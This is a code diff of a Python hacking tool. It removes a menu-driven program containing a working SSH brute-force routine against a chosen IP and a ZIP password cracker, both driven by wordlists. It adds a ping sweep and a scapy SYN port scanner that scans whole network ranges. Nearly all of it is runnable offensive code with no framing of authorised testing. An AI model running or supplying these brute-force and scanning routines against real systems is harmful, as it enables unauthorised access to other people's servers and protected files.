@@ -1,119 +1,83 @@
-import time
-import paramiko
-import zipfile
+#!/Library/Frameworks/Python.framework/Versions/3.12/bin/python3
+
+#!/usr/bin/env python3
+
+import subprocess
+import ipaddress
 import logging
+from scapy.all import *
 
-# Configurar logging
-logging.basicConfig(filename='security_tool.log', level=logging.DEBUG, 
-                    format='%(asctime)s - %(levelname)s - %(message)s')
+# Basic logging configuration
+logging.basicConfig(filename='network_scan.log', level=logging.INFO,
+                    format='%(asctime)s:%(levelname)s:%(message)s')
 
-def offensive_mode(wordlist_path):
-    with open(wordlist_path, 'r', encoding='latin-1') as file:
-        for word in file:
-            word = word.strip()
-            logging.info(f'Offensive mode: trying word - {word}')
-            print(word)
-            time.sleep(1)  # Adiciona um atraso de 1 segundo entre as palavras
-
-def defensive_mode_password_recognition(input_string, wordlist_path):
-    with open(wordlist_path, 'r', encoding='latin-1') as file:
-        words = file.read().splitlines()
-        if input_string in words:
-            logging.info(f'Password recognized: {input_string}')
-            print("Password recognized in the word list.")
+def ping_host(ip_address):
+    """
+    Ping a given IP address and return True if it responds, False otherwise.
+    """
+    try:
+        logging.info(f"Pinging {ip_address}")
+        result = subprocess.run(['ping', '-c', '1', '-W', '2', ip_address], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=5)
+        if result.returncode == 0:
+            logging.info(f"{ip_address} is reachable.")
+            return True
         else:
-            logging.info(f'Password not found: {input_string}')
-            print("Password not found in the word list.")
+            logging.info(f"{ip_address} is not reachable.")
+            return False
+    except subprocess.TimeoutExpired:
+        logging.error(f"Timeout expired while pinging {ip_address}")
+        return False
+    except Exception as e:
+        logging.error(f"Error pinging {ip_address}: {str(e)}")
+        return False
 
-def defensive_mode_password_complexity(password):
-    length_criteria = len(password) >= 8
-    capital_criteria = sum(1 for c in password if c.isupper()) >= 1
-    number_criteria = sum(1 for c in password if c.isdigit()) >= 1
-    symbol_criteria = sum(1 for c in password if not c.isalnum()) >= 1
-    
-    logging.info(f'Password complexity check for: {password}')
-    logging.info(f'Length criteria: {"Passed" if length_criteria else "Failed"}')
-    logging.info(f'Capital letter criteria: {"Passed" if capital_criteria else "Failed"}')
-    logging.info(f'Number criteria: {"Passed" if number_criteria else "Failed"}')
-    logging.info(f'Symbol criteria: {"Passed" if symbol_criteria else "Failed"}')
-    
-    print(f"Password length criteria: {'Passed' if length_criteria else 'Failed'}")
-    print(f"Capital letter criteria: {'Passed' if capital_criteria else 'Failed'}")
-    print(f"Number criteria: {'Passed' if number_criteria else 'Failed'}")
-    print(f"Symbol criteria: {'Passed' if symbol_criteria else 'Failed'}")
-    
-    if length_criteria and capital_criteria and number_criteria and symbol_criteria:
-        logging.info('Password meets all complexity criteria.')
-        print("SUCCESS: Password meets all complexity criteria.")
+def scan_ports(ip_address, port_range):
+    """
+    Scan ports on a given IP address.
+    """
+    open_ports = []
+    for port in port_range:
+        try:
+            syn_packet = IP(dst=ip_address) / TCP(dport=port, flags='S')
+            response = sr1(syn_packet, timeout=1, verbose=0)
+            if response:
+                if response.haslayer(TCP):
+                    if response[TCP].flags == 0x12:  # SYN-ACK
+                        open_ports.append(port)
+                        rst_packet = IP(dst=ip_address) / TCP(dport=port, flags='R')
+                        send(rst_packet, verbose=0)
+                    elif response[TCP].flags == 0x14:  # RST-ACK
+                        pass  # Port is closed
+                elif response.haslayer(ICMP):
+                    if int(response[ICMP].type) == 3 and int(response[ICMP].code) in [1, 2, 3, 9, 10, 13]:
+                        logging.info(f"Port {port} is filtered on {ip_address}.")
+            else:
+                logging.info(f"Port {port} is filtered or silently dropped on {ip_address}.")
+        except Exception as e:
+            logging.error(f"Error scanning port {port} on {ip_address}: {str(e)}")
 
-def ssh_brute_force(ip, username, wordlist_path):
-    with open(wordlist_path, 'r', encoding='latin-1') as file:
-        for password in file:
-            password = password.strip()
-            try:
-                ssh = paramiko.SSHClient()
-                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-                ssh.connect(ip, username=username, password=password)
-                logging.info(f'Successful login with password: {password}')
-                print(f"Successful login: {password}")
-                ssh.close()
-                return
-            except paramiko.AuthenticationException:
-                logging.warning(f'Failed login attempt with password: {password}')
-                print(f"Failed login: {password}")
-            except Exception as e:
-                logging.error(f'Error: {e}')
-                print(f"Error: {e}")
-    logging.info('Brute force attack failed. No valid password found.')
-    print("Brute force attack failed. No valid password found.")
-
-def zip_brute_force(zip_path, wordlist_path):
-    with zipfile.ZipFile(zip_path, 'r') as zip_ref:
-        with open(wordlist_path, 'r', encoding='latin-1') as file:
-            for password in file:
-                password = password.strip()
-                try:
-                    zip_ref.extractall(pwd=password.encode('utf-8'))
-                    logging.info(f'Password found for ZIP file: {password}')
-                    print(f"Password found: {password}")
-                    return
-                except (RuntimeError, zipfile.BadZipFile):
-                    logging.warning(f'Failed attempt with password: {password}')
-                    pass
-    logging.info('Failed to crack the ZIP file password.')
-    print("Failed to crack the ZIP file password.")
+    return open_ports
 
 def main():
-    print("Select mode:")
-    print("1: Offensive; Dictionary Iterator")
-    print("2: Defensive; Password Recognized")
-    print("3: Defensive; Password Complexity")
-    print("4: SSH Brute Force Attack")
-    print("5: ZIP File Brute Force Attack")
-    mode = int(input("Enter mode: "))
+    target_cidr = input("Enter the target network address in CIDR notation (e.g., 192.168.1.0/24): ").strip()
+    try:
+        network = ipaddress.ip_network(target_cidr)
+    except ValueError as e:
+        logging.error(f"Invalid network address: {e}")
+        return
 
-    if mode == 1:
-        wordlist_path = input("Enter word list file path: ")
-        offensive_mode(wordlist_path)
-    elif mode == 2:
-        input_string = input("Enter string to search: ")
-        wordlist_path = input("Enter word list file path: ")
-        defensive_mode_password_recognition(input_string, wordlist_path)
-    elif mode == 3:
-        password = input("Enter password to check complexity: ")
-        defensive_mode_password_complexity(password)
-    elif mode == 4:
-        ip = input("Enter SSH server IP address: ")
-        username = input("Enter SSH username: ")
-        wordlist_path = input("Enter word list file path: ")
-        ssh_brute_force(ip, username, wordlist_path)
-    elif mode == 5:
-        zip_path = input("Enter path to ZIP file: ")
-        wordlist_path = input("Enter word list file path: ")
-        zip_brute_force(zip_path, wordlist_path)
-    else:
-        logging.error('Invalid mode selected.')
-        print("Invalid mode selected.")
+    port_range = range(20, 1025)
+
+    for ip in network.hosts():
+        ip_address = str(ip)
+        if ping_host(ip_address):
+            open_ports = scan_ports(ip_address, port_range)
+            if open_ports:
+                logging.info(f"Open ports on {ip_address}: {open_ports}")
+            else:
+                logging.info(f"No open ports found on {ip_address}.")
+        else:
+            logging.info(f"{ip_address} is down or unresponsive. Skipping port scan.")
 
 if __name__ == "__main__":
     main()
